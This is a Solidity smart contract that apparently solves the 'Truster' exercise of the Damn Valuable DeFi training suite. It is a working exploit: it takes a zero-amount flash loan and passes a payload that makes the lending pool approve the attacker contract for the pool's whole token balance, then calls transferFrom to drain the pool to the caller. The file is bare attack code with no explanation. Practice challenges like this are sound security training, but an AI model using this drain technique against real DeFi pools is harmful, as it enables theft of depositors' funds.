pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}

contract Target {

    ITrusterLenderPool private pool;
    address owner;
    constructor(address poolAddress) {
        pool = ITrusterLenderPool(poolAddress);
        owner = msg.sender;
    }

    function executeFlashLoan(address tokenAddress) external {
        require(msg.sender == owner, "Only owner can execute flashloan");
        uint256 poolBalance = IERC20(tokenAddress).balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, msg.sender, tokenAddress, data);
        IERC20(tokenAddress).transferFrom(address(pool), msg.sender, poolBalance);
    }

}